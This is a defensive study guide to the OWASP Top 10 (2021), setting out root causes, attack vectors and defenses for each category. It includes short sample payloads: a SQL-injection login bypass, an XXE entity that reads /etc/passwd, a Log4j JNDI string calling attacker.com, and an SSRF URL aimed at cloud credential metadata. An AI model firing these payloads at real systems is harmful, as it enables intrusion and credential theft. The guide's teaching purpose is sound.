<div align="center">

<img src="https://capsule-render.vercel.app/render?type=waving&color=gradient&height=280&section=header&text=OWASP%20TOP%2010%20SUPREME%20DOCTRINE&fontSize=38&animation=fadeIn&fontColor=ffffff&desc=Atomic%20Analysis,%20Root%20Causes%20and%20Absolute%20Defense&descFontSize=18&gradient=800080,FF00FF" />

<br>

<img src="https://img.shields.io/badge/STANDARD-OWASP_2021-blue?style=for-the-badge&logo=owasp" />
<img src="https://img.shields.io/badge/LEVEL-SENIOR_ARCHITECT-red?style=for-the-badge&logo=hackthebox" />
<img src="https://img.shields.io/badge/CONTENT-DEEP_ANALYSIS-black?style=for-the-badge&logo=book" />
<img src="https://img.shields.io/badge/LANG-ENGLISH-success?style=for-the-badge&logo=us" />

</div>

<br>

> **"To understand a vulnerability, you must find the assumption in the developer's mind that created it. The security hole is not in the code, but in that false assumption: 'No one would try this.'"**

---

## 🧭 NAVIGATION

| [A01: Access Control](#a01) | [A02: Cryptography](#a02) | [A03: Injection](#a03) | [A04: Design](#a04) | [A05: Config](#a05) |
| :---: | :---: | :---: | :---: | :---: |
| [A06: Components](#a06) | [A07: Identification](#a07) | [A08: Integrity](#a08) | [A09: Logging](#a09) | [A10: SSRF](#a10) |

---

<div id="a01"></div>

## 🔥 A01:2021 – Broken Access Control

This is the **#1** killer of modern web applications.

### 🧬 1. Root Cause (Atomic Analysis)
Developers often confuse the concepts of "Authentication" (Who are you?) and "Authorization" (Can you do this?).
* **The Error:** The system allows the user to enter (Login successful), but fails to check if the user *can access specific data* on every subsequent request.
* **The Mechanism:** The server relies on insecure parameters coming from the client (`id`, `role`, `hidden field`) instead of performing authority checks within the secure server-side session.

### 💀 2. Attack Vector (IDOR - Insecure Direct Object Reference)
The attacker modifies a parameter in the URL or JSON body to access someone else's data.

* **Scenario:**
    * Legitimate Request: `GET /api/invoice?id=1001` (My invoice)
    * Attack: `GET /api/invoice?id=1002` (Someone else's invoice)
* **Result:** If the server only checks "Is the user logged in?" and not "Does this invoice belong to this user?", data is leaked.



### 🛡️ 3. Defense Doctrine
* **Mandatory Access Control:** Ownership checks must be performed for every single database query.
    ```python
    # WRONG
    invoice = db.query("SELECT * FROM invoices WHERE id = ?", input_id)
    
    # RIGHT (Ownership Check)
    invoice = db.query("SELECT * FROM invoices WHERE id = ? AND owner_id = ?", input_id, current_user.id)
    ```
* **Unpredictable IDs:** Use UUIDs (Universally Unique Identifier) instead of sequential IDs (1001, 1002).

---

<div id="a02"></div>

## 🔐 A02:2021 – Cryptographic Failures

Failure to protect sensitive data (PII, Credit Cards).

### 🧬 1. Root Cause
Cryptography is math, and math accepts no errors. Developers often fall into the trap of "Let me write my own encryption algorithm" or are afraid to abandon legacy algorithms.
* **Lack of Entropy:** The Pseudo-Random Number Generator (PRNG) is predictable.
* **Key Management:** Embedding encryption keys directly into the code (Hardcoded Keys).

### 💀 2. Attack Vector
* **Padding Oracle Attack:** Decrypting plaintext by modifying the padding of the ciphertext and analyzing the server's error messages.
* **Downgrade Attack:** Forcing the server to use insecure SSL v3 instead of strong TLS 1.3 to sniff traffic (POODLE).

### 🛡️ 3. Defense Doctrine
* **Never write your own crypto:** Use standard libraries (Libsodium, OpenSSL).
* **Algorithms:**
    * For Hashing: Argon2id or bcrypt (NEVER MD5 or SHA1).
    * For Encryption: AES-256-GCM.
* **Data Transit:** HTTPS only (Include in HSTS Preload list).

---

<div id="a03"></div>

## 💉 A03:2021 – Injection

The fatal moment where data mixes with code.

### 🧬 1. Root Cause
Occurs when an application's "Parser" cannot distinguish between the command written by the developer and the data entered by the user.
* **Context Confusion:** The database engine thinks the `DROP TABLE` command is an executable order, not just a "name" provided by the user.

### 💀 2. Attack Vector (SQL Injection)
* **Scenario:** Login Panel.
    * Code: `SELECT * FROM users WHERE user = '` + `input_user` + `'`
    * Attack Input: `admin' --`
    * Resulting Query: `SELECT * FROM users WHERE user = 'admin' --'`
* **Result:** The `--` sign is a comment in SQL. The rest of the query (password check) is cancelled. The attacker logs in without a password.



### 🛡️ 3. Defense Doctrine
* **Prepared Statements (Parameterized Queries):** The only absolute solution. The query structure is compiled before the data is added.
    ```java
    // RIGHT
    String query = "SELECT * FROM users WHERE user = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, input_user); // The input is treated strictly as 'data' regardless of content.
    ```
* **ORM Usage:** Modern ORMs like Entity Framework and Hibernate automatically prevent injection.

---

<div id="a04"></div>

## 🏗️ A04:2021 – Insecure Design

This is not a "Bug", but a "Flaw". Even if the code is written perfectly, the design can be faulty.

### 🧬 1. Root Cause
Failure to define security requirements at the beginning of the Software Development Life Cycle (SDLC).
* **Example:** Not asking "Can the coupon code be tried infinitely?" during the design phase.

### 💀 2. Attack Vector (Business Logic Abuse)
* **Bot Attacks:** If there is no Rate Limit on an endpoint that checks "Gift Card" balances on an e-commerce site, an attacker can try millions of combinations to find valid cards.
* **Race Condition:** Clicking the "Withdraw Money" button in two windows simultaneously to withdraw money twice before the database updates the balance.

### 🛡️ 3. Defense Doctrine
* **Threat Modeling:** Ask "How can this system be attacked?" before writing code.
* **Rate Limiting:** Apply speed limits to every API endpoint.
* **CAPTCHA:** Implement verification on critical actions to prevent automation.

---

<div id="a05"></div>

## ⚙️ A05:2021 – Security Misconfiguration

The system itself might be secure, but its settings are unsafe.

### 🧬 1. Root Cause
Failure to change default settings and the "If it works, don't touch it" mentality.
* **Unnecessary Information:** Leaving detailed error messages (Stack Traces) enabled.
* **Default Accounts:** Leaving `admin:password` active on panels like Tomcat or Jenkins.

### 💀 2. Attack Vector (XXE - XML External Entity)
If the application accepts XML and the XML parser is misconfigured:
* **Payload:**
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <user>&xxe;</user>
    ```
* **Result:** The server reads the `/etc/passwd` file and returns it to the attacker.

### 🛡️ 3. Defense Doctrine
* **Hardening:** Close all unused ports, services, and features.
* **Error Handling:** Never show technical error messages to the user. Just say "An error occurred" and log the details.
* **XXE Protection:** Disable the `external entities` feature in all XML parsers.

---

<div id="a06"></div>

## 📦 A06:2021 – Vulnerable and Outdated Components

Supply Chain Security.

### 🧬 1. Root Cause
Modern applications use 80% ready-made libraries (Open Source). Developers are afraid to update these libraries (Risk of breaking things).
* **Transitive Dependency:** A vulnerability in a library used by a library you use.

### 💀 2. Attack Vector (Log4j Example)
A vulnerability in Java's most popular logging library, Log4j, compromised half the internet.
* **Attack:** The attacker writes `${jndi:ldap://attacker.com/malware}` in the User-Agent header. The server executes the code while logging it and gets hacked.

### 🛡️ 3. Defense Doctrine
* **SBOM (Software Bill of Materials):** Keep an inventory of all components you use.
* **SCA (Software Composition Analysis):** Continuously scan your project libraries against known CVE databases using tools like `OWASP Dependency Check` or `Snyk`.

---

<div id="a07"></div>

## 🆔 A07:2021 – Identification and Authentication Failures

Theft or impersonation of digital identity.

### 🧬 1. Root Cause
Weak Session management and inadequate password policies.
* **Session ID Entropy:** Predictable session IDs (e.g., SessID=100, SessID=101).

### 💀 2. Attack Vector (Credential Stuffing)
Users use the same password everywhere. An attacker tries a database stolen from another site (Email/Password) on your site.
* **Session Fixation:** The attacker sends a link containing a Session ID they set to the victim (`site.com/?PHPSESSID=hacker_id`). When the victim logs in, the session belongs to the attacker.

### 🛡️ 3. Defense Doctrine
* **MFA (Multi-Factor Authentication):** Make it mandatory. The account remains safe even if the password is stolen.
* **Session Management:**
    * Destroy the old Session ID upon login and issue a new one.
    * Implement Session Timeout.
    * Add `HttpOnly`, `Secure`, and `SameSite` flags to cookies.

---

<div id="a08"></div>

## 🛡️ A08:2021 – Software and Data Integrity Failures

The error of trusting the source of data or code.

### 🧬 1. Root Cause
The application accepts updates, libraries, or objects from untrusted sources without verification.

### 💀 2. Attack Vector (Insecure Deserialization)
Serialization is converting an object (e.g., User object) into a byte stream to store it. Deserialization is converting it back.
* **Attack:** The attacker modifies the serialized data (Cookie, etc.) and injects a malicious command. The server executes the code while converting the data back to an object (Deserialize) -> RCE.



### 🛡️ 3. Defense Doctrine
* **Signing:** Digitally sign serialized data (HMAC) and check the signature before opening.
* **CI/CD Security:** Secure your code deployment pipeline. Ensure code is not modified on its way to production.

---

<div id="a09"></div>

## 👁️ A09:2021 – Security Logging and Monitoring Failures

The failure to notice an attack when it happens.

### 🧬 1. Root Cause
Insufficient logs, logging only "errors" but not "security events" (failed logins, access errors).
* **Critical Error:** Storing logs on the local disk where the attacker can access them.

### 💀 2. Attack Vector
Attackers can remain in the system for months (APT - Advanced Persistent Threat). If the system does not trigger an alarm when "500 database errors occur in 1 minute", no one notices until the attacker drains the database.

### 🛡️ 3. Defense Doctrine
* **What to Log?** Failed logins, access denials, input validation errors.
* **Centralized Logging:** Move logs from the server to a remote server (SIEM) immediately.
* **Alerting:** Send real-time alerts to the SOC team for critical events (e.g., Admin login).

---

<div id="a10"></div>

## ☁️ A10:2021 – Server-Side Request Forgery (SSRF)

Using the server as a proxy to attack the internal network.

### 🧬 1. Root Cause
The application fetches data from a user-supplied URL (e.g., "Upload from URL") but fails to validate where that URL points.

### 💀 2. Attack Vector (Cloud Metadata Attack)
In modern cloud systems (AWS, Azure, GCP), servers retrieve credentials from a special IP address.
* **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
* **Result:** The attacker enters this URL in the profile picture upload field. The server goes to this address, retrieves the AWS keys (Access Keys), and displays them to the attacker. The attacker takes over the entire cloud account.



### 🛡️ 3. Defense Doctrine
* **Network Segmentation:** Use a Firewall to prevent web servers from accessing sensitive resources on the internal network.
* **Allowlist:** Only allow requests to permitted domains (e.g., `*.google.com`, `*.imgur.com`).
* **Response Validation:** Do not show the raw response returned by the server to the user.

---

### 🏁 CONCLUSION: PROFESSIONAL PERSPECTIVE

> **"OWASP Top 10 is not a goal, but a starting point. Real security begins where the list ends. Defense is constant paranoia and a never-ending learning process."**

---
**Status:** `SUPREME_DOCTRINE_READY`
**Revision:** 3.0 (Masterclass)
**Author:** Senior Security Architect